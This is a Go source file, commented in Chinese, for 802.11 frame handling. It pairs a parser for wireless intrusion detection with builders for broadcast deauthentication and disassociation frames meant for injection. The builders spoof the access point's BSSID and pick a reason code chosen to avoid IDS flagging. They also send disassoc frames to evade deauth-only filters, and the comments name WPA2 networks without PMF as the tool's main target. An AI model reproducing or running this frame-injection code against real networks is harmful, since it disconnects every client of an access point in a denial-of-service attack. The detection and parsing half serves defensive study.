// Package ieee80211 负责 802.11 帧的纯字节编解码，不处理任何系统交互。
//
// 802.11 管理帧格式自 1997 年首版标准以来保持稳定，deauthentication 帧
// 在全部 PHY 代际中具有完全相同的字节布局：
//
//	802.11   (1997, 2.4GHz, 1-2 Mbps, FHSS/DSSS)
//	802.11b  (1999, 2.4GHz, 11 Mbps, DSSS/CCK)
//	802.11a  (1999, 5GHz,   54 Mbps, OFDM)
//	802.11g  (2003, 2.4GHz, 54 Mbps, OFDM)
//	802.11n  (2009, 2.4/5GHz, HT,  MIMO, 600 Mbps)
//	802.11ac (2013, 5GHz,   VHT, MU-MIMO, ~3.5 Gbps)
//	802.11ax (2019, 2.4/5GHz; 2021 WiFi 6E 扩展至 6GHz, HE, OFDMA)
//	802.11be (2024, 2.4/5/6GHz, EHT, 320MHz, MLO, WiFi 7)
//
// 差异只在物理层（调制、带宽、MIMO 与频段），管理帧的 MAC 头格式不变。
// 真正影响 deauth 有效性的是 802.11w（PMF, Protected Management Frames）：
// WPA3 与 6GHz 频段强制启用 PMF，未认证广播 deauth 会被客户端直接丢弃；
// 2.4/5GHz 的 WPA2 网络普遍不启用 PMF，是本工具的主要作用面。
package ieee80211

import (
	"errors"
	"net"
)

const (
	// Radiotap 头部长度：version(1) + pad(1) + length(2) + it_present(4)。
	// 不携带任何扩展字段时最小即 8 字节，注入驱动按当前信道/速率发送。
	radiotapHeaderLen = 8

	// 802.11 管理帧 MAC 头部长度：
	// Frame Control(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtl(2)。
	macHeaderLen = 24

	// deauthentication 帧体长度：仅 Reason Code 一个字段（uint16 小端）。
	reasonCodeLen = 2

	// DeauthFrameLen 是完整注入帧长度：Radiotap(8) + MAC头(24) + Reason(2)。
	DeauthFrameLen = radiotapHeaderLen + macHeaderLen + reasonCodeLen
)

const (
	// frameTypeManagement 是 802.11 帧类型字段中的管理帧取值（bit 2-3 = 00）。
	frameTypeManagement = 0

	// 管理帧子类型取值（Frame Control 低字节 bit 4-7）：
	// IDS 只关心这四类——它们无需关联即可空中发送，是攻击与侦测的主战场。
	subtypeDeauth    = 12
	subtypeDisassoc  = 10
	subtypeBeacon    = 8
	subtypeProbeResp = 5
)

// 管理帧子类型的导出别名：IDS 帧分类按此判定，避免调用方触碰私有常量。
const (
	SubtypeBeacon    = subtypeBeacon
	SubtypeProbeResp = subtypeProbeResp
	SubtypeDisassoc  = subtypeDisassoc
	SubtypeDeauth    = subtypeDeauth
)

// deauth 帧使用的 Reason Code（802.11 标准 §9.4.1.7 定义）。
const (
	// ReasonClass3FromNonAssoc = 7，表示“收到来自未关联 STA 的 Class 3 帧”。
	// 客户端收到携带该值的 deauth 后会认为自身关联状态已失效，从而主动断开。
	// 这是 deauth 攻击中最常用且最不容易被入侵检测标异的合法原因码。
	ReasonClass3FromNonAssoc uint16 = 7
)

// BuildDeauthFrame 构造广播 802.11 deauthentication 管理帧。
// 返回帧长度为 DeauthFrameLen（34 字节），可直接经 monitor 接口注入空中：
// Linux/Android 使用 AF_PACKET，Windows 使用 Npcap 的 pcap_sendpacket。
//
// 广播地址（addr1=ff:ff:ff:ff:ff:ff）让 AP 下所有关联客户端同时失效；
// WPA3/6GHz 网络因 PMF 强制启用会丢弃该帧，属协议层面的固有约束。
func BuildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
	return buildManagementFrame(bssid, subtypeDeauth)
}

// BuildDisassocFrame 构造广播 802.11 disassociation 管理帧。
// 与 deauth 帧结构完全相同（34B），仅 Frame Control 子类型不同：
// disassoc(10) 替代 deauth(12)。客户端对两者的帧过滤路径不同，
// 同时发两种帧可覆盖只过滤 deauth 但不过滤 disassoc 的实现。
func BuildDisassocFrame(bssid net.HardwareAddr) ([]byte, error) {
	return buildManagementFrame(bssid, subtypeDisassoc)
}

// buildManagementFrame 是 deauth/disassoc 的公共构造器。
// 两种帧结构一致：radiotap(8B) + MAC 头(24B) + reason(2B) = 34B，
// 唯一差异是 Frame Control 低字节的子类型字段（bit 4-7）。
func buildManagementFrame(bssid net.HardwareAddr, subtype int) ([]byte, error) {
	if len(bssid) != 6 {
		return nil, errors.New("BSSID 长度错误，必须为 6 字节 MAC 地址")
	}

	frame := make([]byte, DeauthFrameLen)

	// Radiotap 最小头：仅声明自身长度为 8，不携带任何字段。
	frame[0] = 0x00
	frame[1] = 0x00
	frame[2] = radiotapHeaderLen
	frame[3] = 0x00

	// Frame Control：version(0) | type(management) | subtype。
	// 低字节 bit 4-7 放子类型，bit 2-3 放类型 0（管理帧）。
	frame[8] = byte(subtype<<4 | frameTypeManagement<<2)
	frame[9] = 0x00

	// Duration：注入场景下无 NAV 预留需求，置 0。
	frame[10] = 0x00
	frame[11] = 0x00

	// addr1（Receiver/Destination）：广播地址。
	for i := 0; i < 6; i++ {
		frame[12+i] = 0xff
	}

	// addr2（Transmitter/Source）= BSSID：伪装成 AP 自己发出。
	copy(frame[18:24], bssid)

	// addr3（BSS Identifier）= BSSID。
	copy(frame[24:30], bssid)

	// Sequence Control：置 0 占位，网卡芯片发送时按自身序列计数器填充。
	frame[30] = 0x00
	frame[31] = 0x00

	// Reason Code：uint16 小端置于帧尾。
	frame[32] = byte(ReasonClass3FromNonAssoc)
	frame[33] = byte(ReasonClass3FromNonAssoc >> 8)

	return frame, nil
}

// ManagementInfo 是一条空中管理帧的关键字段摘录。
// Transmitter 取自 addr2（收发双方中“发送方”永远在 addr2），
// 是 deauth 风暴与信标泛洪的归因主键；SSID 仅在信标/探测响应中解析。
type ManagementInfo struct {
	Subtype     int
	Transmitter net.HardwareAddr // addr2：发送方 MAC
	Receiver    net.HardwareAddr // addr1：接收方 MAC（广播=ff:*）
	BSSID       net.HardwareAddr // addr3：帧所属 BSS
	ReasonCode  uint16           // 仅 deauth(12)/disassoc(10) 有效
	SSID        string           // 仅 beacon(8)/probe-resp(5) 有效，隐藏网络为空
}

// RadioTapLen 从 radiotap 头部读取自身总长（it_len，小端 u16）。
// 有了 it_len 就无需逐位展开 it_present 位图即可跳到 802.11 帧本体。
// 返回 false 表示头部不完整或长度不合理，调用方应按无 radiotap 处理。
func RadioTapLen(frame []byte) (int, bool) {
	if len(frame) < radiotapHeaderLen {
		return 0, false
	}

	length := int(frame[2]) | int(frame[3])<<8
	if length < radiotapHeaderLen || length > len(frame) {
		return 0, false
	}

	return length, true
}

// ParseManagement 解析不带 radiotap 的 802.11 管理帧。
// 数据帧（type!=00）返回错误：IDS 关心的去认证/信标/探测响应全部是管理帧，
// 数据帧只服务吞吐，不值得为它拓宽解析面。
func ParseManagement(frame []byte) (ManagementInfo, error) {
	if len(frame) < macHeaderLen {
		return ManagementInfo{}, errors.New("帧长不足 24 字节，MAC 头不完整")
	}

	if frameType := frame[0] >> 2 & 0x03; frameType != frameTypeManagement {
		return ManagementInfo{}, errors.New("非管理帧，仅解析 type=00 的管理帧")
	}

	info := ManagementInfo{
		Subtype:     int(frame[0] >> 4),
		Transmitter: net.HardwareAddr(append([]byte(nil), frame[10:16]...)),
		Receiver:    net.HardwareAddr(append([]byte(nil), frame[4:10]...)),
		BSSID:       net.HardwareAddr(append([]byte(nil), frame[16:22]...)),
	}

	// deauth/disassoc 帧体第一个字段是 Reason Code（uint16 小端）。
	if (info.Subtype == subtypeDeauth || info.Subtype == subtypeDisassoc) && len(frame) >= macHeaderLen+reasonCodeLen {
		info.ReasonCode = uint16(frame[macHeaderLen]) | uint16(frame[macHeaderLen+1])<<8
	}

	// 信标与探测响应的帧体：固定参数 12 字节（时间戳 8 + 间隔 2 + 能力 2），
	// 其后是 TLV 信息元素；SSID 是首个元素（编号 0），空 SSID 即隐藏网络。
	if info.Subtype == subtypeBeacon || info.Subtype == subtypeProbeResp {
		info.SSID = parseSSIDElement(frame[macHeaderLen:])
	}

	return info, nil
}

// parseSSIDElement 在管理帧体的信息元素区扫描 SSID（元素编号 0）。
// 信标与探测响应的固定参数同为 12 字节（时间戳 8 + 间隔 2 + 能力 2），
// TLV 自描述，统一从固定段之后扫起。
// 长度为 0 即隐藏网络，返回空串；截断/畸形同样返回空串不抛错，
// IDS 不应把攻击者构造的畸形帧升级成运行时故障。
func parseSSIDElement(body []byte) string {
	offset := 12
	for offset+2 <= len(body) {
		tagLength := int(body[offset+1])
		if body[offset] == 0 {
			if offset+2+tagLength > len(body) {
				return ""
			}

			return string(body[offset+2 : offset+2+tagLength])
		}

		offset += 2 + tagLength
	}

	return ""
}
